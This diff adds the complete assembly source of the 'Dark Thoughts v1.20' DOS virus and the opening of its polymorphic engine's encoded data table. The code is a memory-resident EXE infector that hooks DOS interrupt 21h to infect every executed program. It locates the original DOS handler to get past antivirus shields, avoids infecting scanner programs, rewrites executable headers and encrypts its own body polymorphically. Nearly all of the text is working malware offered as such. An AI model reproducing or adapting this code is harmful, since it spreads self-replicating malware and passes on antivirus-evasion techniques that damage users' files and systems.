@@ -1,0 +1,1809 @@
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[dt12.asm]컴
+;Virus Name: DARK THOUGHTS v1.20
+;Origin    : Europe/Greece
+;Author    : ANAKTAS
+;
+;GENERAL INFO:
+;   -Size: Increase files by 6144 bytes.    
+;   -TSR EXE infector 
+;   -Polymorphic by using ENTHELECHIA v1.0 (Source in enthel.SPL)
+;   -UMB Resident
+;   -Seeks Original Int 21h by using signatures 
+;    instead of tunneling.
+;
+; This virus is actually vanitas II with some changes. 
+; I wrote it to demostrate my poly engine ENTHELECHIA V1.0.
+;_______________________________________________________
+
+
+APPLYSIZE  equ  6144
+BUFFERSIZE equ 16384
+ALOCSIZE   equ 22528+1024
+
+CODE SEGMENT
+ASSUME CS:CODE,DS:CODE,ES:CODE
+
+org 0000h
+VIRUS_V:
+
+;-------------------------place-decryptor-Here------------------------
+;Decryptor Will destroy DS or ES(makes it ecual to CS) 
+;_________________________________________________________________
+
+startofvirusbody:
+
+      ;get delta offset in BP
+	mov bp,0
+	
+
+;save PSP
+	mov ax,ds
+        mov bx,cs
+        cmp ax,bx
+        Jnz SavePSP
+        mov ax,es
+savePSP:mov ds,ax
+ 	mov es,ax
+	mov cs:[BP+datasegm],ax
+
+
+; am i in memory ?       
+	mov ax,3700h  
+	mov bx,0FACEh 
+	int 21h       
+	cmp ax,0FACEh 
+	jnz not_in_mem
+	jmp giveCPU
+	not_in_mem:
+
+;scans for original INT21h. 
+       call scan21
+
+
+;check if we are in protected mode (Windows,Win95,OS/2)
+;if yes, don't try to stay in memory but infect some files...
+     mov ax,1687h
+     int 2Fh
+     or ax,ax
+     jnz no_DPMI  
+
+;allocate memory for buffer
+	mov bx,ALOCSIZE/16 
+	call alloc_mem
+	mov ax,ds       
+        mov cs:[BP+buffer],ds
+
+;infect Command.com 
+	call infect_command  
+
+;release buffer
+         mov ax,cs:[BP+buffer]
+	 mov es,ax
+	 mov ah,49h
+	 int 21h
+
+	 jmp giveCPU     
+no_DPMI:        
+
+;allocate memory for buffer and for code
+	mov bx,ALOCSIZE/16 
+	call alloc_UMB
+        jc stay_in_conv 
+        mov cs:[BP+buffer],ds
+
+;infect Command.com 
+	call infect_command          
+	
+	mov bx,ALOCSIZE/16
+	call alloc_UMB
+	jc stay_in_conv
+	jmp Yes_UMB
+	
+;No UMB - use_oldtrick
+;----------------------------------------
+stay_in_conv:
+
+;Move code next to PSP. 
+;only a small part to avoid overwritting
+	push cs
+	pop ds
+        mov ax,cs:[BP+datasegm]
+	add ax,10h
+	mov es,ax
+        mov di,0        
+        mov si,bp        
+        mov cx,offset firstpart 
+	cld                
+	rep movsb 
+
+; Pass the mic to the TSR  copy of virus
+        mov ax,es
+        push ax
+        mov ax,offset Warp        
+	push ax          
+	retf             
+	Warp:   
+
+        xor BP,BP ;Delta offset is zero now. 
+
+;now copy the rest!
+        mov cx,APPLYSIZE
+        sub cx,offset firstpart
+        cld
+	rep movsb
+	jmp firstpart ;clean-up prefetch queue
+	firstpart:
+	
+;resize host 
+        mov ax,cs:[datasegm]
+	mov es,ax
+	mov bx,ALOCSIZE/16  
+	mov ah,4ah
+	int 21h
+	
+;new buffer
+        mov ax,cs:[datasegm] ;PSP
+        add ax,10h       ;+PSP=viruscode
+	add ax,APPLYSIZE/16   ;+virussize= end of viruscode
+	mov cs:[buffer],ax ;buffer 
+	
+;infect Command.com 
+	call infect_command          
+
+;Redirect Interrupt 21h to new21  
+	mov ax,2521h         
+	push cs
+	pop ds               
+	mov dx,offset new21  
+	int 21h              
+
+; Create parametre block
+	push cs
+	pop es
+	mov bx,offset envir
+	mov ax,ds:[datasegm]
+	mov ds:[line+2],ax     
+	mov ds:[FCB1+2],ax
+	mov ds:[FCB2+2],ax
+	mov ax,80h
+	mov ds:[line],ax
+	mov ax,5Ch
+	mov ds:[FCB1],ax
+	mov ax,6Ch
+	mov ds:[FCB2],ax
+	mov ds,ds:[datasegm]
+	mov ax,ds:[2ch] ;
+	mov cs:[envir],ax    ;  ds=enviroment
+	
+	mov ds,ax  ;ds=enviroment            
+	
+
+; Locate filename.
+	mov di,0ffffh  
+	xixi:          
+	inc di         
+	mov ax,ds:[di] 
+	cmp ax,0000    
+	jnz xixi        
+	add di,4       
+	mov dx,di      
+
+; Move stack to the end of allocated memory.
+	cli
+	mov ax,cs   
+	mov ss,ax   
+	mov sp,APPLYSIZE
+	sti
+
+; Execution of the host (EXEC)
+	
+	mov ax,4b00h 
+	call dos21
+	cli
+	mov ax,cs    ; Recall stack area. Exec might destroy SS and SP. 
+	mov ss,ax     
+	mov sp,APPLYSIZE
+	sti
+
+; Get exit-code of the host
+	MOV AH,4Dh  
+	INT 21h      ; By returning the same return-code.
+
+;Return to dos by returning the same exit-code(errorlevel). 
+	mov ah,31h
+	mov dx,ALOCSIZE/16  ;keep bytes in memory   
+	int 21h      
+;--------------------------------------
+
+Yes_UMB:
+;copy virus code to the reserved memory 
+	push ds 
+	pop es
+	push cs
+	pop ds
+	mov di,0
+        mov si,BP       
+	mov cx,APPLYSIZE
+	rep movsb                    
+
+;Redirect Interrupt 21h to new21  
+	mov ax,2521h         
+	push es
+	pop ds               
+        lea dx,[BP+new21]
+	int 21h              ; now!
+
+giveCPU:
+;calculate original entry-point and PUSH it... 
+        mov ax,cs
+        sub ax,cs:[BP+entry+2]
+	push ax
+        mov ax,cs:[BP+entry]
+	push ax
+;GET DS/ES
+        mov ax,cs:[BP+datasegm]
+	mov ds,ax
+	mov es,ax
+; AX=BX=CX=DX=SI=DI=BP=0000
+	xor ax,ax 
+	xor bx,bx
+	xor cx,cx
+	xor dx,dx
+	xor di,di
+	xor si,si
+	xor bp,bp
+	retf ;jmp to the original entry-point
+;---------------------------------------------------------------
+
+
+
+
+
+
+
+
+;________________________________________________________________
+;The new Interrupt 21h handler!
+;----------------------------------------------------------------
+	new21:	
+	pushf
+	cli
+
+;verifies that virus has already hook int21h
+	cmp ax,3700h     ; asking for command line switch chracter...
+	jnz not_verify 
+	cmp bx,0FACEh    ; or for me?
+	jnz not_verify 
+	call dword ptr cs:[adr21]
+	mov ax,bx        ; Yes, i am here!
+	iret           
+	not_verify:    
+
+
+	push ax ; push them...
+
+        xor Ah,4bh ;Execute  file?
+	jz filefuc  
+	xor Ah,4bh 
+
+		 
+;	xor ah,3Dh ; open file?    
+;	jz filefuc   
+;	xor ah,3Dh 
+	
+		 
+;	xor ah,56h ; rename file?
+;	jz filefuc
+;	xor ah,56h
+		 
+;	xor ah,43h ; get file atribs?
+;	jz filefuc
+;	xor ah,43h
+
+;	mov dx,si
+;	xor ah,6Ch ; Extented open?
+;	jz filefuc
+;	xor ah,6Ch
+	
+
+	jmp notfilefuc
+
+filefuc:
+	pop ax
+	mov cs:[BP+filename+2],dx 
+	call dword ptr cs:[adr21]
+	mov dx,cs:[BP+filename+2]
+	push bp
+	xor bp,bp
+	call infect ; you have to wait a little!
+	pop bp
+	iret           
+
+notfilefuc:
+	pop ax
+	popf
+	jmp dword ptr cs:[adr21]
+;-------------------------------------------------------------
+
+
+
+
+
+
+
+;-------------------------------------------------------------
+;calls the original INT21h bellow drivers,TSR utils, ;AV shields,etc. 
+;-------------------------------------------------------------
+dos21:
+pushf
+call dword ptr cs:[BP+orig_adr21]
+ret
+;--------------------------------------------------------------
+
+
+
+
+
+
+
+
+;--------------------------------------------------------------
+;infects files. Assumes that the file name is at DS:DX
+;--------------------------------------------------------------
+infect:
+
+;push them all.
+	push ax 
+	push bx 
+	push cx 
+	push si 
+	push es 
+	push dx 
+	push ds 
+	push bp 
+
+;backups the entry point. 
+	mov ax,cs:[BP+entry]
+	mov cs:[BP+entrybackup],ax
+	mov ax,cs:[BP+entry+2]
+	mov cs:[BP+entrybackup+2],ax
+
+; saves the filename
+;don't know why i did that! 
+	mov cs:[BP+filename+2],dx 
+	mov cs:[BP+filename],ds 
+
+;if filename == *AN.* or *OT.* or *EX.* or *86.* or *ND.* don't infect it.
+;target files are tbscan.exe,tbclean.exe,scan.exe,f-prot.exe and mscdex.exe
+;Also if file isn't *.EXE or *.COM don't infect it either...
+	mov bx,dx
+findend:
+	inc bx
+	cmp byte ptr ds:[bx],0
+	jnz findend
+	sub bx,6
+	cmp ds:[bx],0444Eh
+	jz cant_open
+	cmp ds:[bx],03638h
+	jz cant_open
+	cmp ds:[bx],04E41h
+	jz cant_open
+	cmp ds:[bx],0544Fh
+	jz cant_open
+	cmp ds:[bx],05845h
+	jz cant_open
+	cmp ds:[bx+3],05845h
+	jz ComExe
+	cmp ds:[bx+3],04F43h
+	jnz cant_open
+	ComExe:
+
+
+;check for free clusters
+	push dx      
+	mov ah,36h    
+	mov bx,dx
+	mov dl,ds:[bx]
+	and dl,0fh
+	call dos21
+	pop dx
+	test bx,bx
+	jnz enough_space
+	jmp cant_open
+enough_space:
+
+;get file's atributes
+	mov ax,4300h 
+	call dos21
+        jc cant_open
+	mov cs:[BP+atrib],cl ; and save them
+
+;is it a sybdir or volume name ?
+;I whouldn't like that.
+	test cx,00011000b    
+	jnz cant_open        
+
+
+;read only file?  Not any more.
+	and cx,11111110b 
+	mov ax,4301h     
+	call dos21          
+	jc cant_open    ; Why can't i write on disk? Maybe 
+			; write-protected disk or CD-ROM. Game Over.
+
+
+
+;open file by using the priv 21 handler to prevent
+;endless recersive (and overflow of stack)
+	mov ax,3d92h    
+	call dos21
+	jc cant_open   
+	mov cs:[BP+handler],ax       ; save the handle to [handler]
+
+;_____________________
+       jmp bridge1   ;|
+cant_open:           ;|
+       jmp cant_open2;|
+bridge1:             ;|
+;_____________________|
+
+;from now on, (data segment) = (code segment)
+;no need for CS: override    
+	push cs 
+	pop ds   
+
+;get date-time of file and save it 
+	mov ax,5700h      
+	mov bx,cs:[BP+handler]        
+	call dos21         
+	mov cs:[BP+time],cx ; save date-time
+	mov cs:[BP+date],dx 
+    
+;get buffer
+	;mov ds,cs:[BP+buffer]   
+
+;reads header (first 84h bytes of file)  
+	mov ah,3fh            
+	mov bx,cs:[BP+handler]
+	mov cx,84h
+	;mov ds,cs:[BP+buffer]   
+	mov dx,offset header             
+	call dos21              
+
+;is that file an EXE ?
+	mov ax,5a4dh     
+	cmp ax,ds:[bp+header]   ;lets check for "MZ" at offset 0000 0000h
+	jnz close_file  ;if not close it and wait for the next file
+
+;is it infected?
+        mov ax,0faceh
+        cmp ax,ds:[bp+header+12h]
+	jz close_file  
+
+
+
+;Is it a PE (win95 & NT) , NE(win) or .DLL file?
+	mov     si,ds:[bp+header+3ch]   
+        mov     ax,ds:[bp+header+si]   
+	sub     al,'N'      
+	and     al,1101b    
+	cmp     ax,0050h    
+	jz      close_file   ;if yes then don't infect it
+
+	
+;______________________
+       jmp bridge2    ;| 
+close_file:           ;|
+       jmp close_file2;|
+bridge2:              ;|  
+;______________________|
+
+;For testing only. Ask before infect a file.
+;	call    ask_me
+;	jnz close_file  
+
+
+;go to the end of file
+	mov ax,4202h   
+	xor cx,cx    
+	xor dx,dx    
+	call dos21      
+
+;save the size of the file
+	mov cs:[BP+size1],ax   
+	mov cs:[BP+size1+2],dx 
+
+; if file.size>448Kbyte don't infect it.
+	cmp dx,0007h   
+	jc not2big      
+	jmp close_file  
+not2big:        
+
+
+;tells to the header that filesize+=APPLYSIZE/512                
+mov word ptr ds:[bp+header+2],ax   ;file_length MOD 512
+and word ptr ds:[bp+header+2],511                    
+mov cl,9   ; header[bp+header+4] = file_length(DX:AX) DIV 512 
+shr ax,cl       
+mov cl,7       
+shl dx,cl       
+add ax,dx       
+add ax,(APPLYSIZE/512)+1
+mov word ptr ds:[bp+header+4],ax 
+
+
+
+;add APPLYSIZE bytes. The increase of file size must be known
+;seems usefull for future use (stealthing)         
+	mov ah,40h    ; write...
+	mov cx,APPLYSIZE   ; 
+	call dos21    ; bytes.
+
+;the virus code must start from a paragraph (*16 bytes)
+	add cs:[BP+size1],10h
+	and cs:[BP+size1],0FFF0h
+
+	mov dx,ds:[bp+header+8h]
+	mov cs:[BP+headersize],dx
+
+
+;copy original entry point to [entry]
+mov ax,ds:[bp+header+14h]     
+mov cs:[BP+entry],ax   
+mov ax,ds:[bp+header+16h]     
+mov cs:[BP+entry+2],ax 
+
+;loads the size of the file. The place here virus body will be placed
+mov ax,cs:[BP+size1]
+mov dx,cs:[BP+size1+2]
+
+;writes the new entry point which points to the virus body
+mov cl,4  ; AX= (DWord DX:AX) / 16
+shr ax,cl   
+mov cl,12
+shl dx,cl
+add ax,dx
+
+sub ax,ds:[bp+header+8]
+mov ds:[bp+header+16h],ax      
+sub ax,cs:[BP+entry+2]
+mov cs:[BP+entry+2],ax
+mov ax,100h      
+mov ds:[bp+header+14h],ax  
+
+
+;set the fucking stack
+;if its inside the program leave it, else place it inside the virus code   
+mov ax,[offset header+10h+bp]   ;get SP 
+sub ax,2
+mov cl,4
+shr ax,cl
+add ax,[offset header+0Eh+bp]   ;ax holds the address of stack's head in paragraphs   
+sub ax,2
+mov bx,[offset size1+2+bp]
+mov dx,[offset size1+bp]
+mov cl,12
+shl bx,cl
+mov cl,4
+shr dx,cl
+add bx,dx
+cmp ax,bx
+jc dontchangestack 
+mov ax,APPLYSIZE
+mov word ptr ds:[offset header+10h+bp],ax ;SP
+mov ax,ds:[offset header+16h+bp] ;SS
+mov word ptr ds:[offset header+0Eh+bp],ax ;SS
+dontchangestack:     
+
+
+
+;put my mark in the place of header Checksum
+mov ax,0faceh
+mov ds:[offset header+12h+bp],ax
+
+;writes header from memory to file
+mov ax,4200h        	;go to the beggining
+mov bx,cs:[offset handler+bp]
+xor cx,cx            
+xor dx,dx            
+call dos21              
+mov ah,40h          	;write 84h 
+mov bx,cs:[offset handler+bp]
+mov cx,84h          
+mov dx,[offset header+bp]             
+call dos21          	;go at the end    
+mov ax,4200h
+mov cx,word ptr cs:[BP+size1+2]
+mov dx,word ptr cs:[BP+size1]
+call dos21
+
+
+;------POLY-------
+mov ax,cs:[BP+buffer]  ;build the two buffers in ES:0 and DS:0
+mov ds,ax
+add ax,(BUFFERSIZE/16)/2
+mov es,ax
+
+call splrand  ;randomize SPL variables
+
+;set some spl variables
+push bx
+mov bx,1
+mov word ptr es:[EXi_IsCOM],bx   ; set EXE type decryptors	
+
+mov bx,offset startofvirusbody
+mov word ptr es:[EXi_VirusBodyStart],bx   ; set the virusbody  offset
+
+mov bx, (offset endofvirusbody) - (offset startofvirusbody)
+mov es:[EXi_VirusBodyLength],bx   ; set the virus lenght
+pop bx
+
+;move the stack in a big,safe place
+cli
+mov ax,ss
+mov cs:[oldSS],ax
+mov cs:[oldSP],sp
+push cs
+pop ss
+mov sp,APPLYSIZE
+sti
+
+;call the engine
+push dx
+push si
+push bp
+mov dx,cs
+mov si,offset spldata
+call splvm     ;build decryptor/encryptor
+pop bp
+pop si
+pop dx
+
+;move the stack back in place
+cli
+mov ax,cs:[oldSS]
+mov sp,cs:[oldSP]
+mov ss,ax
+sti
+
+
+;patch the "mov bp,offset" instruction in the beggining of virus 
+push bx
+mov bx,es:[EXo_EncryptedVirusBodyOffset]   
+mov cs:[bp+1],bx 	
+pop bx
+
+
+;call the encryptor
+push ds
+push es
+lea ax,[BP+offset returnencrypt];push the return address
+push cs
+push ax
+mov ax,0 ;push the address of the encryptor
+push ds
+push ax
+push cs ; set the source/destination segments
+push ds
+pop es
+pop ds
+db 0CBh ;return(?) to the encryptor
+returnencrypt:
+pop es
+pop ds
+;------POLY END-------
+
+
+mov bx,100h      
+mov bx,es:[EXo_DecryptorStart]
+mov cs:[bp+header+14h],bx      
+ 
+	 
+mov ax,4000h     ; writes the encrypted virus to file
+mov bx,cs:[BP+handler]
+mov cx,APPLYSIZE ; 
+mov dx,0h        ;
+call dos21       ;    
+
+
+;writes header from memory to file
+mov ax,4200h        	;go to the beggining 
+mov bx,cs:[BP+handler]
+xor cx,cx            
+xor dx,dx            
+call dos21              
+mov ah,40h          	;write 84h 
+mov bx,cs:[BP+handler]
+mov cx,84h          
+lea dx,[bp+offset header]
+push cs
+pop ds   
+call dos21          	;go at the end    
+mov ax,4200h
+mov cx,word ptr cs:[BP+size1+2]
+mov dx,word ptr cs:[BP+size1]
+call dos21
+
+
+close_file2:
+mov ah,3eh           
+mov bx,cs:[BP+handler]           
+call dos21           
+cant_open2:
+
+;restore Host's entry-point of the current copy of virus. 
+	mov ax,cs:[BP+entrybackup]
+	mov cs:[BP+entry],ax
+	mov ax,cs:[BP+entrybackup+2]
+	mov cs:[BP+entry+2],ax
+
+pop bp ;
+pop ds ; 
+pop dx ;
+pop es ;
+pop si ;
+pop cx ;
+pop bx ;
+pop ax ;         
+ret
+;_____________________________________________________________
+
+
+
+;______________________________________________________________
+;Old but good!!! 
+;________________________________
+;replaces int21h with new24 handler
+hook24:
+	push ds              
+	push dx             
+	push cs             
+	pop  ds             
+	lea dx,[BP+new24] 
+	mov ax,2524h        
+	int 21h             
+	pop dx              
+	pop ds              
+	ret                 
+
+;returns vector of int24 to its owner
+unhook24:                   
+	push ds             
+	mov ax,cs:[BP+old24+2]  
+	mov ds,ax           
+	mov dx,cs:[BP+old24]    
+	mov ax,2524h        
+	int 21h             
+	pop ds              
+	ret                 
+
+;Special Interrupt 24h error handler which allways returns 
+; "(I)gnore" without asking the user.
+new24:
+	xor al,al  ; 
+	iret       ; 
+
+;DATA. Address of original Interrupt 24h handler
+old24   dw 0,0 
+;_______________________________________________________________
+
+
+
+;_______________________________________________________________
+;Infect well known files
+;
+;_______________________________________________________________
+infect_command:
+
+	ret  ;Sorry but win98 fucks everything. 
+
+	push ds
+	push cs
+	pop ds            
+
+        lea dx,[BP+offset target2]
+        call infect
+        lea dx,[BP+offset target1]
+	call infect
+	
+	pop ds
+	ret          ;return();
+
+;data
+target1: db "C:\COMMAND.COM",0
+target2: db "C:\WINDOWS\COMMAND.COM",0
+
+;______________________________________________________________
+
+
+
+
+
+
+
+ 
+
+;_______________________________________________________________
+;Scan memory for original Int 21h handlers.
+;It doesn't use tunneling because i dont want to waste Kbytes for
+;a good one. I use Signatures instead. YES, SIGNATURES!!!
+;This trick seems to work till microsoft release its first polymorphic  
+;Interrupt handler! 
+;
+;Scan Engine V1.0b
+;This Version of Scan21 can detect the location of the folowing Int21s: 
+;Microsoft.Dos.Int21h.V5.00        
+;Microsoft.Dos.Int21h.V6.20
+;Microsoft.Dos.Int21h.Win95
+;
+;Microsoft.Int21h.Win95 reported to be "on the wild"! 
+;_______________________________________________________________
+scan21:
+      push ds
+      mov ax,3521h        ; get int21 address by using vector table
+      int 21h             ; do it!
+      mov cs:[BP+adr21],bx   ; and save it to [adr21]
+      mov cs:[BP+adr21+2],es ;
+      mov cs:[BP+orig_adr21],bx   ; ...and to [orig_adr21] in case we can't 
+      mov cs:[BP+orig_adr21+2],es ; find original int21h
+
+;try to find the original int 21h of DOS v5.00,v6.20 and WIN95
+
+Dos5:  mov ax,0     ;dos 5.00
+       mov bx,40EBh
+Dos5lp:inc ax
+       mov ds,ax
+       cmp ax,0FFFFh
+       jz Dos62
+       cmp ds:[bx],80FAh
+       jnz Dos5lp
+       cmp ds:[bx+2],6CFCh
+       jnz Dos5lp
+       cmp ds:[bx+4],0D277h
+       jnz Dos5lp
+       jmp found_21
+    
+Dos62:  mov ax,0     ;dos 6.20
+	mov bx,40F8h
+Dos62lp:inc ax
+	mov ds,ax
+	cmp ax,0FFFFh
+	jz Win95
+	cmp ds:[bx],80FAh
+	jnz Dos62lp
+	cmp ds:[bx+2],6CFCh
+	jnz Dos62lp
+	cmp ds:[bx+4],0D277h
+	jnz Dos62lp
+	cmp ds:[bx+6],0FC80h
+	jnz Dos62lp
+	jmp found_21
+
+
+Win95:  mov ax,0     ;Win95
+       mov bx,04A0h
+Win95lp: inc ax
+       mov ds,ax
+       cmp ax,0FFFFh
+       jz NoFound
+	cmp word ptr ds:[bx+5],0F62Eh
+       jnz Win95lp
+	cmp word ptr ds:[bx+7],3506h
+       jnz Win95lp
+	cmp word ptr ds:[bx+9],0200h
+       jnz Win95lp
+	cmp word ptr ds:[bx+0Bh],02074h
+       jnz Win95lp
+       ;jmp found_21  ;no need to do that.
+
+found_21:
+        mov cs:[bp+orig_adr21],bx          
+        mov cs:[bp+orig_adr21+2],ds        
+NoFound:pop ds
+        ret
+;------------------------------------------------------------------
+
+
+
+
+
+
+;________________________________________________________________
+;Resize host and allocate memory
+;input: bx=paragraphs of neaded memory
+;output: ds=segment of memory
+;        carry set=no memmory
+;________________________________________________________________
+alloc_mem:
+	push ax
+	push bx
+	push cx
+	push dx
+	push es
+	push bx
+
+;resize host's memory
+	mov ax,cs:[BP+datasegm]
+	mov es,ax       
+	dec ax
+	mov ds,ax
+	inc bx
+	sub word ptr ds:[12h],bx
+	mov dx,ds:[3] 
+	sub dx,bx
+	mov bx,dx
+	
+	mov ah,4Ah
+	int 21h
+	mov ah,48h
+      pop bx    
+	int 21h
+      pushf
+	
+	jc alloc_end
+	mov ds,ax
+	alloc_end:
+	
+      popf
+	
+	pop es
+	pop dx
+	pop cx
+	pop bx  
+	pop ax
+	ret
+;_______________________________________________________________
+
+
+
+
+
+
+;________________________________________________________________
+;allocate UMB
+; input: bx=paragraphs of needed memory 
+;output: carry=0 / ds=segment of memory
+;        carry set=no memory 
+;________________________________________________________________
+alloc_UMB:
+	push ax
+	push bx
+	push cx
+	push dx 
+	push es
+	push bx
+
+;inclusion of UMB 
+	mov ax,05803h   
+	mov bx,1
+	int 21h
+;search from the end of memory
+	mov ax,5801h    
+	mov bx,81h
+	int 21h
+;allocate BX paragraphs         
+	mov ah,48h             
+      pop bx
+	int 21h       
+      
+      pushf  ;save the Carry flag 
+      push ax;save the segment adress of memory block  
+	
+;no more UMB
+	mov ax,05803h
+	xor bx,bx
+	int 21h
+;search from the start of memory
+	mov ax,5801h         
+	xor bx,bx
+	int 21h
+	
+      pop ax 
+      popf
+
+	jc End_AllocUMB  ;no memory?
+	cmp ax,0A000h
+	jc End_AllocUMB  ;that's not in Upper Memory!
+	mov ds,ax ; pass segment adress to DS     
+
+End_AllocUMB:   
+      
+	pop es
+	pop dx
+	pop cx
+	pop bx  
+	pop ax
+	ret
+;_______________________________________________________________
+
+
+
+
+;________________________________________________________________
+;Poly-engine
+include enthelec.inc
+include splVM.inc
+include splrand.inc
+;________________________________________________________________
+
+
+
+
+;__________________________________________________________________
+;data , data , data...
+
+;parametre block for EXEC (4Bh/Int21h)
+envir  dw ?   ;segment of the enviroment
+line   dw 80h ; command line offset
+       dw ?   ;    >>    >>  segment
+FCB1   dw 5Ch ; 1st FCB offset
+       dw ?   ;  >>  >> segment
+FCB2   dw 6Ch ; 2nd FCB offset
+       dw ?   ;  >>  >> segment
+
+;general infos about the file to be infected
+filename    dw 0,0
+atrib       db 0
+date        dw 0
+time        dw 0
+size1       dw 0,0
+headersize  dw 0
+
+;keep here the entry-point of the host program
+entry       dw 0000,0016 ; first time return to PSP:0  (INT 20h) 
+entrybackup dw 0000,0000 ;back up here the [entry] data
+
+;segment of the buffer.
+buffer     dw 0
+
+
+;where PSP is.
+datasegm    dw 0
+
+;SS:SP before calling the POLY
+oldSS       dw 0 
+oldSP       dw 0
+
+;file handler
+handler    dw 0
+
+;header structure
+header          dw 0
+filesizeMOD	dw 0
+filesizeDIV	dw 0
+	dw 0  
+hdrsize	dw 0
+minmem	dw 0
+maxmem	dw 0
+stackSS	dw 0
+stackSP	dw 0
+checksum	dw 0
+initIP	dw 0
+codeCS	dw 0
+relocadr	dw 0
+reloctable db 80h dup (0) 
+
+
+;vectors of interrupt21
+orig_adr21	dw 0,0
+adr21		dw 0,0  
+adr13		dw 0,0
+
+;Virus Message
+	  db "Dark Thoughts Ve"
+          db "r1.20 - EuR(c)98"          
+          db " by ANAkTAS.    "
+	  db "Using ENTHELECHIA v1.0 "
+          db "Poly-Engine made with SPL."
+	     ;0123456789ABCDEF 
+
+
+endofvirusbody:
+
+CODE ENDS
+     END VIRUS_V                                                           
+;________________________________________________________________
+
+
+
+
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[dt12.asm]컴
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[enthelec.inc]컴
+;   SPL for Windows V2.2
+;   (c)1998 by ANAkTAS
+;
+;   Description	:
+;    This file contain the data table. 
+;    
+; ------------------------------------------------------------
+ 
+;The size of the allocated buffer must be greater than 4824 bytes.
+;The data table is compressed. Its compressed size is 2271 bytes.
+;The original size is 4312 bytes. Ratio is: 1.8987  
+
+spldata DB  216,016,012,251,249,000,000,246,106,249,000,000,246,099,249,000
+        DB  000,246,098,249,000,000,246,097,249,000,000,246,096,249,000,000
+        DB  246,095,249,000,000,246,094,249,000,000,246,093,249,000,000,246
+        DB  092,249,000,000,246,087,249,000,000,246,085,249,000,000,246,084
+        DB  249,000,000,246,083,249,000,000,246,080,249,000,000,246,077,249
+        DB  000,000,246,075,249,000,000,246,073,249,000,000,246,071,249,000
+        DB  000,246,070,249,000,000,246,068,249,000,000,246,067,249,000,000
+        DB  246,063,249,000,000,246,061,249,000,000,246,054,249,000,000,246
+        DB  049,251,251,251,255,005,251,249,000,001,246,000,234,251,249,240
+        DB  000,247,004,249,031,000,241,243,246,000,234,234,255,023,012,005
+        DB  155,000,015,234,235,234,255,025,012,005,011,000,016,234,012,007
+        DB  007,000,235,012,007,008,000,012,006,016,000,020,012,006,007,000
+        DB  019,012,006,007,000,032,234,251,247,000,246,044,012,005,006,000
+        DB  045,012,005,006,000,046,234,255,027,255,028,255,030,235,235,235
+        DB  251,249,001,000,246,026,234,012,010,010,000,234,012,012,023,000
+        DB  251,249,002,000,246,030,012,006,071,000,026,234,012,005,021,000
+        DB  024,012,006,014,000,024,234,234,234,234,255,026,251,249,003,000
+        DB  246,017,234,251,249,005,000,246,017,234,234,255,024,251,249,006
+        DB  000,246,018,234,251,249,007,000,246,018,234,234,255,025,012,007
+        DB  019,000,021,012,006,019,000,021,012,009,053,000,021,012,006,053
+        DB  000,012,017,017,000,012,020,034,000,012,005,181,000,008,234,234
+        DB  255,048,235,235,235,235,235,012,005,005,000,012,005,005,000,251
+        DB  255,005,251,036,033,234,251,184,140,211,021,051,245,004,234,234
+        DB  234,234,252,255,033,235,251,244,235,251,247,000,246,049,000,012
+        DB  005,057,000,050,234,252,251,080,251,249,088,000,234,234,251,083
+        DB  251,249,091,000,234,234,234,255,051,180,251,184,245,004,234,234
+        DB  255,052,001,002,003,004,009,017,018,234,205,022,251,236,234,251
+        DB  236,234,195,251,247,000,246,053,234,234,234,255,034,012,008,073
+        DB  000,054,012,006,073,000,055,234,251,247,004,249,003,000,241,246
+        DB  037,234,251,247,035,249,007,000,241,246,035,234,251,247,036,012
+        DB  005,010,000,036,234,255,035,012,005,148,000,249,000,000,246,035
+        DB  234,235,235,235,234,255,035,251,247,036,249,001,000,239,246,036
+        DB  012,005,039,000,110,012,005,039,000,234,255,036,012,009,040,000
+        DB  036,012,005,040,000,251,247,035,249,080,000,239,236,012,005,037
+        DB  000,012,005,009,000,255,056,251,249,184,000,247,035,239,236,234
+        DB  251,141,251,249,006,000,247,035,249,003,000,238,239,236,234,234
+        DB  234,245,004,245,037,251,247,000,246,057,234,255,058,012,005,038
+        DB  000,036,012,010,038,000,036,012,011,038,000,251,247,037,249,007
+        DB  000,240,236,012,005,188,000,059,234,251,249,072,012,006,043,000
+        DB  255,060,235,251,129,251,249,224,012,006,014,000,244,255,244,255
+        DB  234,251,133,251,249,192,000,247,036,012,007,064,000,239,236,234
+        DB  234,251,129,251,249,248,012,006,035,000,000,000,234,234,117,251
+        DB  247,000,246,061,000,012,006,070,000,035,239,236,234,255,062,012
+        DB  008,070,000,035,012,015,070,000,035,012,007,172,000,012,011,070
+        DB  000,035,012,012,070,000,063,000,012,005,232,000,088,012,006,241
+        DB  000,035,012,006,009,000,012,005,118,001,064,234,234,234,255,065
+        DB  251,244,235,251,249,015,000,247,004,241,249,016,000,243,246,038
+        DB  234,245,038,251,247,000,247,038,012,005,004,003,012,029,029,000
+        DB  012,058,058,000,144,244,245,244,251,244,252,244,248,244,249,012
+        DB  007,091,002,234,255,066,012,135,137,000,251,255,032,235,235,251
+        DB  233,251,247,000,246,067,000,000,234,234,012,006,011,000,068,000
+        DB  000,234,234,012,006,032,000,247,000,246,069,012,006,248,002,232
+        DB  251,247,000,246,070,000,012,005,226,002,034,012,007,015,000,071
+        DB  012,006,015,000,025,251,255,072,251,012,005,047,002,018,012,005
+        DB  153,001,141,255,024,054,062,012,007,091,003,073,012,005,087,000
+        DB  255,074,012,006,032,000,017,012,007,032,000,026,030,046,012,007
+        DB  032,000,075,000,000,234,234,252,251,255,076,012,024,033,000,077
+        DB  012,006,065,000,078,012,020,097,000,245,016,251,247,016,249,008
+        DB  000,237,236,234,234,234,251,255,079,012,024,068,000,080,012,006
+        DB  168,000,027,255,081,251,251,247,030,012,005,083,003,030,234,255
+        DB  028,251,249,176,000,247,030,239,236,234,012,005,055,000,030,239
+        DB  236,234,234,245,014,255,028,235,251,247,014,012,008,085,000,253
+        DB  251,255,082,251,249,048,000,247,028,249,001,000,241,012,005,043
+        DB  000,040,012,010,013,000,234,012,010,078,000,251,247,030,247,030
+        DB  249,003,000,238,249,192,000,012,006,159,002,012,011,106,000,030
+        DB  251,251,249,004,012,012,055,000,251,249,128,012,012,083,000,192
+        DB  000,247,030,247,004,249,008,000,241,012,007,059,000,012,031,031
+        DB  000,012,062,062,000,012,091,093,000,012,017,064,001,234,234,234
+        DB  255,029,235,253,014,031,234,253,014,007,234,234,234,012,010,112
